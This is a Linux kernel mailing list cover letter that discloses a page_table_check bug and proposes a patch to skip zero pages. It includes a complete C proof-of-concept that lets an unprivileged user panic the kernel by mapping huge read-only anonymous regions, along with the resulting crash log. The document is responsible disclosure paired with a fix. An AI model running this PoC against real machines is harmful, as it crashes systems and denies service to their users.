Return-Path: <owner-linux-mm@kvack.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 5F961C4451C
	for <linux-mm@archiver.kernel.org>; Tue, 21 Jul 2026 15:56:50 +0000 (UTC)
Received: by kanga.kvack.org (Postfix)
	id 0045A6B0093; Tue, 21 Jul 2026 11:56:49 -0400 (EDT)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id F1E316B0095; Tue, 21 Jul 2026 11:56:48 -0400 (EDT)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id E0D316B0096; Tue, 21 Jul 2026 11:56:48 -0400 (EDT)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0010.hostedemail.com [216.40.44.10])
	by kanga.kvack.org (Postfix) with ESMTP id AC1FC6B0093
	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 11:56:48 -0400 (EDT)
Received: from smtpin07.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay10.hostedemail.com (Postfix) with ESMTP id 36E35C01F7
	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 15:56:48 +0000 (UTC)
X-FDA: 85013236896.07.D20753D
Received: from mail-pl1-f182.google.com (mail-pl1-f182.google.com [209.85.214.182])
	by imf01.hostedemail.com (Postfix) with ESMTP id 8621640013
	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 15:56:46 +0000 (UTC)
Authentication-Results: imf01.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=TphnWG6h;
	spf=pass (imf01.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.214.182 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1784649406;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:references:dkim-signature;
	bh=XmIj32erS1jwigWOXNUBRAhRVATS+2+Si6E1lz8XJNc=;
	b=4b9dJFje1cKIumx9z0Z2vwQAtPiysMrLZIGMz3/r46knDWMReRdf7Fbxw4To4+ynINwFx4
	qw5bOhRW4Z1KXl87Rh8XTEZlqcRJ8juyracrWdU9Y7Dx5FiJLXNIvcvYkE5rUhk5ga7yMl
	biZ6/bjb1knbJI1f+bqjinNIva6RXlo=
ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
	t=1784649406;
	b=iK835RpQx2pjrgXin30Ymhyx7pTpu2wAM6Hxm06idYV0D21SX1se1GEGhNQyawPLjGFSc1
	nqAIs2rkjs9Rcbg8145TH4+z2eXGnt1rRlzhLXwiXd9AufHBVH1Gj11AqdVekDwfnNrCyp
	PUwWA5X0cgoY9YtJFQxfQtcmLq2D7k0=
ARC-Authentication-Results: i=1;
	imf01.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=TphnWG6h;
	spf=pass (imf01.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.214.182 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
Received: by mail-pl1-f182.google.com with SMTP id d9443c01a7336-2cf52d15d88so32557805ad.2
        for <linux-mm@kvack.org>; Tue, 21 Jul 2026 08:56:46 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784649405; x=1785254205; darn=kvack.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=XmIj32erS1jwigWOXNUBRAhRVATS+2+Si6E1lz8XJNc=;
        b=TphnWG6hJpr0MY94O8aTChKJio6jWn8BAaFqR71eKc/a8+qEyjOeYbLmgURe3Or5hJ
         VL9XdNRznsUbdDatX50y1jJLPPzTW5jt4oD/asXCmwKxq/Iyjh2JwZKM6NU2qbqt4pNb
         TkWprbLKrvGJV67HiOQ94FXxpMXFSSzN9/kH9jj03+tfJpFR0sybl9/9iWOxdxD+wmRn
         yrJTVjjfLNVwhCUlTwh9SXp/pai412i2oeweOVmCGpWNRzxnmpz2fNCPN6R8uB66BO2j
         3+pYPhKH4iUrLK6SPzUqhusJlVckxY4l2Hz95TCvGE98p5HDxIpFYN9jhi4J7Sbouj28
         rlUA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784649405; x=1785254205;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=XmIj32erS1jwigWOXNUBRAhRVATS+2+Si6E1lz8XJNc=;
        b=O6Ag7evxnofWrj3Wrwo6AcgJJto6oWvijRPqJs0P+aQ0xVCjNt6OSMJVHhu1PTSndp
         DLrETfnF5yY84LcJdnmyvLMvcTWAxJeNVpoEHeQZRPBy3jMz7nbTaZwNw47CZ9LvOJXQ
         EX/ZuOaNBlNfyTFEamNK/dZs9p9dvc/EHe1rXk4Rt2kFhLMQei6c+RbV8IhYFdib7Muy
         K0VKfh0VXJW84bUG2wzF628seEx7rp/mEYteuBYszWAKe00rUHgX2pZCw5Xj/lYH2PRB
         /r1rR7uARwdwkPTKipf6TQsFlXk1Ft1+5C/IWv1LyvClC+yFoHwFfRm4wj/ondjBm5xq
         hhZA==
X-Gm-Message-State: AOJu0YyY9imXdWPqNO5xVWChvC8ZZyXNx+coMIiEj/6hIcIcw8Gfoucq
	cTIzFbGBEB5AQTYdDRG7+39Ui1+UsOzKqL+9hN9ZwYAnDPROPpjXHQOcmwG8e/ra
X-Gm-Gg: AR+sD11AtLI8jkMResNA7RI3Lw/3Tq/ge9bOcuDNTAL3rN5zEmvZynrKJ4QRV7+biF9
	duz4JCChu/t12T8shhoE2IKFIlaXmnGgNLpABK/B0YlrrVQ7XC7NXTI3uCwNu4nw+7/HKeoJXbF
	ifO98SHACxP1SGTMjZh7Pt0Q2IovUNTJ/VcS+ciOr3kAFdXm4DP1YbK8fX4PWrkrrwb+bPuPehm
	FMhwfOxlgCpcRqKyZKMbDlSdc8wiEHuzjDzvafTHckYxcQbUvRYJelOduQyCX5ugXv9/qfel0b/
	tHNpuocmEfXULy6sloNUJekozdHpMXOjCJ5yqGeYNezn+VJJUNkWCiPw6ERtWW6tYyyaxZg2PsE
	gdptpfT1E0Fy5WlgLFTWCwh9MfXUqEsVsgZ7ShzOUzrMMH57JjwZpK4VT10JqV0gcuXLgYnjUcJ
	G8i8Gmbrwv7HDKejLnnA==
X-Received: by 2002:a17:903:4b50:b0:2c9:c952:6e9 with SMTP id d9443c01a7336-2cf3483689emr204724045ad.2.1784649404876;
        Tue, 21 Jul 2026 08:56:44 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([144.48.80.242])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cf345111d5sm78494075ad.37.2026.07.21.08.56.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 21 Jul 2026 08:56:44 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-mm@kvack.org
Cc: pasha.tatashin@soleen.com,
	akpm@linux-foundation.org,
	vega@nebusec.ai,
	roxy520tt@gmail.com,
	enjou1224z@gmail.com
Subject: [PATCH v2 0/1] mm/page_table_check: skip zero pages
Date: Tue, 21 Jul 2026 23:56:37 +0800
Message-ID: <cover.1784645969.git.roxy520tt@gmail.com>
X-Mailer: git-send-email 2.51.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Rspamd-Server: rspam10
X-Rspamd-Queue-Id: 8621640013
X-Stat-Signature: x1bgitnjfr5wnoyiooioyswytusr4ipq
X-Rspam-User: 
X-HE-Tag: 1784649406-94218
X-HE-Meta: U2FsdGVkX1/YObcxBYTFdhsaIe91k2vdikoYgCpIgOUBddACgGIfYekIHqTRkbkNHSMNTkAmY/ArBx8c/FqSKDVrLlNJRK7ftd2JYvq5i403EU2bGPiIC+Rv8HYCaofd48jKmqfrlanTvEiXd1nUwqjtrkKyxYy070iLw1WWvW21YDvCN5saiDWox5FyryM1mdYpTFnBSXzzrvWEjsB04ejClPzubYJnHpL8ZJbDwPvAtc9nn3ozK5tr7CK0gFjAtGYXt6oyv3pNwFP82hps66TRQxlAkREmCjDe+dyTono6+Bj/yvfxEBxiosbQA1kvMPZTK+y8bcRxLQ/J3emfHgGUbOobK8WTj+hfhrf2GGR5DPoYXxpu1FToY+9s1KlI3G/w3HD6Yv5dhAw/iScwChWiI5mFJuz1ENZQ7Ee59JMMjMl2JDrNwm4Oi1vyDMrRmEScSuRqf5b1uVzf4FzZ9pBpKqeq5piVNMyQ1eviXJDe2v1hAWK3Zi123R1NgqSpHltswQ78MBKJqJabzxqe08T3hp6AKKrXPZT6uE5wU2f2YE5z4Xd8JEXt6WcwnUfobsvNco9StkNYPi3zhKo/gd1sUWUPf6Ti3Q1hG+yeBoQo/rHl0z9g5CNmlk2d+opVyqe9h9wdRV592jfhXpZAFOd2DM5j1CG9MfL6g3u9wJnojOW/2LMPbfybAqh1sf+KLBkbSTa8hzoRmPlU8J44cFJ0fJJCzp8au3WlsbBfql/2Ln+S8IEPSOK0dMq1KyNhkwnkSMTVUIyar30Lpf9y/Veb+/1zmbNLiwGlGQtaDLwm+eWN1CXzQT7y+QrVBnDo5LkKIx0A35bS6SKMEOvYCmUGHLPamdknm96LrubgdfTHwxu0rqVja+nabgC+Jm4bVU0oaCFITpXmsX+UlVKatj6HcT0KFheZE4e8Irrk6B6Lk3LGWM49khYoVjEWkrcPIwb5RGoi3u4hRbJc8dY
 uV+Dj1Nn
 bAcRptm21RG1ngavqgDdF5qJPD0K+n4uNAs4AKu/I9y+4YrJ2lvMHcNEgoKnSr9HB7qzZep95fIJYbp5T/O6pbnqBNh9jTtKq/vlo8x/Wo1DiMD4gj3AxWhG9uHiBkdFQxoJ6gu94REzE95nrzOcp80dCK9Ho9E8nErX5midh/b2Pbg6nYPuTbyR07uMPefA/5jg7WtcUl11dHAuf80bIlZ5xq0fT0BN9PyZ3iBgdbBZKmGJVk1ybfhWPfA3RRbVEy+FlLb0bPx5B7rzEtaTPFeMoU43NPBvyGBJhaKiWgIhqZ0UMwaW72MnCtD0nYvY8+YD9R39O7CZX6/a09bRXOuRHGxdf06oK+JDKHVUmuYGCmzz1DPGjcXAjWDDJhJuVMANY2/RceqTBnJ1ZsH6OpBY9yCX2DnbN6hWq/dwuEYIWziI9/+tacZ2BGc3kWfUhYJWPXTT+QbQJXpk=
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
List-Unsubscribe: <mailto:majordomo@kvack.org>

From: Zhiling Zou <roxy520tt@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in mm/page_table_check.c. The bug is
reachable by a non-root user directly, without user or network
namespaces.

We've built the changed object, and the fix should not affect normal
page_table_check functionality because it only treats permanent zero
pages as a special case while leaving the existing ordinary-page checks
unchanged.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

page_table_check_set() and page_table_check_clear() account pages based
on whether PageAnon() is set. The shared zero page is a special page,
not an ordinary file-backed page, but the current code still counts its
read-only anonymous mappings in file_map_count.

An unprivileged process can fault enough private anonymous read-only
memory to repeatedly map the shared zero page until file_map_count wraps
negative, after which page_table_check_set() or page_table_check_clear()
trips the existing BUG_ON().

This fix skips zero pages in page_table_check accounting. Those pages do
not need the anonymous-versus-file conflict checks which
page_table_check performs for ordinary pages, and this keeps the counter
size and page_ext layout unchanged.

Reproducer:

    gcc -O2 -Wall -Wextra -static -o poc poc.c
    ./poc

The PoC defaults to 16 workers and 513 GB of read-only anonymous virtual
space per worker. We run the PoC in a 16 vCPU, 24 GB RAM x86 QEMU
environment with panic_on_warn=0.
------BEGIN poc.c------

#define _GNU_SOURCE

#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef MADV_POPULATE_READ
#define MADV_POPULATE_READ 22
#endif

static unsigned long long env_ull(const char *name, unsigned long long def)
{
	const char *s = getenv(name);
	char *end = NULL;
	unsigned long long v;

	if (!s || !*s)
		return def;

	errno = 0;
	v = strtoull(s, &end, 0);
	if (errno || !end || *end) {
		fprintf(stderr, "invalid %s=%s\n", name, s);
		exit(2);
	}
	return v;
}

static void worker(int sync_fd, unsigned long long gigabytes,
		   unsigned long long base_addr_tb)
{
	const unsigned long long len = gigabytes << 30;
	const uintptr_t hint = (uintptr_t)(base_addr_tb << 40);
	void *addr;
	char c;

	if (read(sync_fd, &c, 1) < 0) {
		perror("read(sync_fd)");
		_exit(1);
	}
	close(sync_fd);

	addr = mmap((void *)hint, len, PROT_READ,
		    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE |
			    MAP_FIXED_NOREPLACE,
		    -1, 0);
	if (addr == MAP_FAILED && errno == EEXIST) {
		addr = mmap(NULL, len, PROT_READ,
			    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1,
			    0);
	}
	if (addr == MAP_FAILED) {
		fprintf(stderr, "[%d] mmap(%llu GB) failed: %s\n", getpid(),
			gigabytes, strerror(errno));
		_exit(1);
	}

	if (madvise(addr, len, MADV_NOHUGEPAGE) != 0) {
		fprintf(stderr, "[%d] MADV_NOHUGEPAGE failed: %s\n", getpid(),
			strerror(errno));
		_exit(1);
	}

	fprintf(stderr, "[%d] populating %llu GB at %p\n", getpid(), gigabytes,
		addr);
	fflush(stderr);

	if (madvise(addr, len, MADV_POPULATE_READ) != 0) {
		fprintf(stderr, "[%d] MADV_POPULATE_READ failed: %s\n", getpid(),
			strerror(errno));
		_exit(1);
	}

	fprintf(stderr, "[%d] populated; holding mapping\n", getpid());
	fflush(stderr);
	for (;;)
		pause();
}

int main(void)
{
	const unsigned long long workers = env_ull("POC_WORKERS", 16);
	const unsigned long long gigabytes = env_ull("POC_GB_PER_WORKER", 513);
	const unsigned long long base_addr_tb = env_ull("POC_BASE_ADDR_TB", 4);
	pid_t *pids;
	int sync_pipe[2];
	unsigned long long i;

	if (workers == 0 || gigabytes == 0) {
		fprintf(stderr, "POC_WORKERS and POC_GB_PER_WORKER must be > 0\n");
		return 2;
	}

	printf("workers=%llu gb_per_worker=%llu total_gb=%llu base_addr_tb=%llu\n",
	       workers, gigabytes, workers * gigabytes, base_addr_tb);
	fflush(stdout);

	pids = calloc(workers, sizeof(*pids));
	if (!pids) {
		perror("calloc");
		return 1;
	}

	if (pipe(sync_pipe) != 0) {
		perror("pipe");
		return 1;
	}

	for (i = 0; i < workers; i++) {
		pid_t pid = fork();

		if (pid < 0) {
			perror("fork");
			return 1;
		}
		if (pid == 0) {
			close(sync_pipe[1]);
			worker(sync_pipe[0], gigabytes, base_addr_tb);
		}
		pids[i] = pid;
	}

	close(sync_pipe[0]);
	close(sync_pipe[1]);

	for (;;) {
		int status;
		pid_t pid = wait(&status);

		if (pid < 0) {
			if (errno == EINTR)
				continue;
			perror("wait");
			return 1;
		}

		if (WIFEXITED(status))
			fprintf(stderr, "child %d exited with status %d\n", pid,
				WEXITSTATUS(status));
		else if (WIFSIGNALED(status))
			fprintf(stderr, "child %d killed by signal %d\n", pid,
				WTERMSIG(status));
		fflush(stderr);
	}
}

------END poc.c--------

----BEGIN crash log----

[ 1513.218556][T10794] kernel BUG at mm/page_table_check.c:121!
[ 1513.219101][T10785] kernel BUG at mm/page_table_check.c:121!
[ 1513.219102][T10787] kernel BUG at mm/page_table_check.c:121!
[ 1513.219103][T10795] kernel BUG at mm/page_table_check.c:121!
[ 1513.219106][T10791] kernel BUG at mm/page_table_check.c:121!
[ 1513.219146][T10785] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[ 1513.219173][T10785] CPU: 4 UID: 1028 PID: 10785 Comm: poc Tainted: G        W           7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[ 1513.219181][T10785] Tainted: [W]=WARN
[ 1513.219184][T10785] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1513.219191][T10785] RIP: 0010:page_table_check_set+0x47a/0x660
[ 1513.219223][T10785] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
[ 1513.219227][T10785] RSP: 0018:ffa00000174df708 EFLAGS: 00010282
[ 1513.219233][T10785] RAX: 0000000080000004 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
[ 1513.219236][T10785] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
[ 1513.219239][T10785] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
[ 1513.219242][T10785] R10: ff11000100cf9ebf R11: 0000000000000007 R12: 0000000000000000
[ 1513.219245][T10785] R13: ff11000100cf9eb8 R14: dffffc0000000000 R15: 00000000000131fd
[ 1513.219249][T10785] FS:  00007f4996890780(0000) GS:ff110005d0a68000(0000) knlGS:0000000000000000
[ 1513.219255][T10785] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1513.219258][T10785] CR2: 00005606316be348 CR3: 00000001a2981000 CR4: 0000000000751ef0
[ 1513.219261][T10785] PKRU: 55555554
[ 1513.219263][T10785] Call Trace:
[ 1513.219266][T10785]  <TASK>
[ 1513.219275][T10785]  __page_table_check_ptes_set+0x19e/0x310
[ 1513.219281][T10785]  ? __pfx___page_table_check_ptes_set+0x10/0x10
[ 1513.219288][T10785]  ? __pfx_pfn_pte+0x10/0x10
[ 1513.219302][T10785]  do_anonymous_page+0x11f3/0x1df0
[ 1513.219311][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219322][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219330][T10785]  __handle_mm_fault+0x151f/0x1f90
[ 1513.219337][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219343][T10785]  ? __pfx_do_raw_spin_lock+0x10/0x10
[ 1513.219357][T10785]  ? __pfx___handle_mm_fault+0x10/0x10
[ 1513.219365][T10785]  ? pte_offset_map_lock+0xf5/0x260
[ 1513.219370][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219375][T10785]  ? find_held_lock+0x2b/0x80
[ 1513.219388][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219392][T10785]  ? follow_page_pte+0x3fb/0xf50
[ 1513.219402][T10785]  handle_mm_fault+0x2ad/0x8c0
[ 1513.219413][T10785]  __get_user_pages+0x3b5/0x29a0
[ 1513.219428][T10785]  ? __pfx___get_user_pages+0x10/0x10
[ 1513.219434][T10785]  ? rcu_is_watching+0x12/0xc0
[ 1513.219444][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219487][T10785]  faultin_page_range+0x276/0x6c0
[ 1513.219493][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219501][T10785]  madvise_do_behavior+0x2ce/0x4a0
[ 1513.219513][T10785]  ? __pfx_madvise_do_behavior+0x10/0x10
[ 1513.219520][T10785]  ? down_read+0x142/0x460
[ 1513.219548][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219552][T10785]  ? rw_verify_area+0x71/0x560
[ 1513.219563][T10785]  do_madvise+0x12e/0x1b0
[ 1513.219569][T10785]  ? __pfx_do_madvise+0x10/0x10
[ 1513.219574][T10785]  ? __pfx_vfs_write+0x10/0x10
[ 1513.219595][T10785]  ? __pfx_ksys_write+0x10/0x10
[ 1513.219605][T10785]  __x64_sys_madvise+0xa9/0x110
[ 1513.219609][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219614][T10785]  ? lockdep_hardirqs_on+0x7b/0x110
[ 1513.219620][T10785]  do_syscall_64+0x116/0xf80
[ 1513.219628][T10785]  ? irqentry_exit+0x117/0x830
[ 1513.219636][T10785]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[ 1513.219640][T10785] RIP: 0033:0x7f499699fbf7
[ 1513.219659][T10785] Code: ff e8 2d 7d ff ff 48 8b 54 24 28 64 48 2b 14 25 28 00 00 00 75 05 48 83 c4 38 c3 e8 f3 ff 00 00 0f 1f 00 b8 1c 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d e9 81 0d 00 f7 d8 64 89 01 48
[ 1513.219663][T10785] RSP: 002b:00007ffc39138e78 EFLAGS: 00000202 ORIG_RAX: 000000000000001c
[ 1513.219668][T10785] RAX: ffffffffffffffda RBX: 0000040000000000 RCX: 00007f499699fbf7
[ 1513.219671][T10785] RDX: 0000000000000016 RSI: 0000008040000000 RDI: 0000040000000000
[ 1513.219674][T10785] RBP: 0000008040000000 R08: 0000000000000000 R09: 0000000000000000
[ 1513.219677][T10785] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000201
[ 1513.219679][T10785] R13: 0000040000000000 R14: 0000000000000002 R15: 00005575774bbd18
[ 1513.219706][T10785]  </TASK>
[ 1513.219708][T10785] Modules linked in:
[ 1513.219718][T10785] ---[ end trace 0000000000000000 ]---
[ 1513.219719][T10795] Oops: invalid opcode: 0000 [#2] SMP KASAN NOPTI
[ 1513.219722][T10785] RIP: 0010:page_table_check_set+0x47a/0x660
[ 1513.219728][T10785] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
[ 1513.219732][T10785] RSP: 0018:ffa00000174df708 EFLAGS: 00010282
[ 1513.219730][T10795] CPU: 7 UID: 1028 PID: 10795 Comm: poc Tainted: G      D W           7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[ 1513.219736][T10785]
[ 1513.219740][T10795] Tainted: [D]=DIE, [W]=WARN
[ 1513.219739][T10785] RAX: 0000000080000004 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
[ 1513.219743][T10795] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1513.219744][T10785] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
[ 1513.219748][T10785] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
[ 1513.219752][T10785] R10: ff11000100cf9ebf R11: 0000000000000007 R12: 0000000000000000
[ 1513.219748][T10795] RIP: 0010:page_table_check_set+0x47a/0x660
[ 1513.219755][T10785] R13: ff11000100cf9eb8 R14: dffffc0000000000 R15: 00000000000131fd
[ 1513.219760][T10795] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
[ 1513.219761][T10785] FS:  00007f4996890780(0000) GS:ff110005d0a68000(0000) knlGS:0000000000000000
[ 1513.219764][T10795] RSP: 0018:ffa00000172ef708 EFLAGS: 00010286
[ 1513.219767][T10785] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1513.219768][T10795]
[ 1513.219771][T10795] RAX: 0000000080000003 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
[ 1513.219772][T10785] CR2: 00005606316be348 CR3: 00000001a2981000 CR4: 0000000000751ef0
[ 1513.219775][T10795] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
[ 1513.219776][T10785] PKRU: 55555554
[ 1513.219779][T10795] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
[ 1513.219781][T10785] Kernel panic - not syncing: Fatal exception
[ 1514.282927][T10785] Shutting down cpus with NMI
[ 1514.283092][T10785] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  mm/page_table_check: skip zero pages

 mm/page_table_check.c | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

-- 
2.43.0


